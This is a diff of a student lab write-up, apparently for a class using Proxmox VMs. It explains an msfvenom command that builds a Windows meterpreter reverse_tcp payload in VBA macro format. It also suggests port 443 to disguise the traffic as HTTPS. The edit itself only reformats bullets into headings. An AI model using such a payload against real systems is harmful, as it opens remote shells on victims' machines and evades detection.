@@ -18,16 +18,16 @@ After adding Ben to the group a little later into the semester, I opened up the 
 AI suggested using MSFVenom to create the payload and after looking into it, I realized that it was implemented in metasploite which we have experience with and acess to on our proxmox VMs. 
 This was the main website I used to research the flags and how to use them(reading the instruction in the terminal is a bit of a headache for me) https://www.offsec.com/metasploit-unleashed/msfvenom/  
 Ultimately the command I came up with was msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f vba.  
-* -p
+#### -p
 - the flag to start creating a payload
 - "windows" to target a windows machine(any of the promox machines in our case)  
 - "meterpreter" is the interactive shell component
 - "reverse_tcp" makes the victim reach out to our attacking machine
-* LHOST will be our attacking machines IP(kali linux proxmox vm)
-* LPORT will be the port we have our listener setup on
+#### LHOST will be our attacking machines IP(kali linux proxmox vm)
+#### LPORT will be the port we have our listener setup on
 - Can use 4444 which is the metasploit default
 - Another option is 443 if we want to be sneaky and make it look like HTTPS traffic  
-* -f VBA
+#### -f VBA
 - f = format of the output
 - vba = visual basic for applications format
 
